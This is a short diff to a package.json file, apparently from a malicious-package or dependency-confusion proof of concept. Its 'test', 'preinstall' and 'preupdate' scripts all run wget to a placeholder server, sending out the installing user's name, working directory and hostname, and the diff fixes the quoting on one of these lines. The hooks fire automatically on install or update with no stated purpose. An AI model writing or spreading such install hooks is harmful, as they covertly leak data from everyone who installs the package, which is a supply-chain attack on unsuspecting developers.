@@ -29,7 +29,7 @@ package.json
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "wget --quiet http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
+    "test": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
     "preinstall": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
     "preupdate": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" "
   },
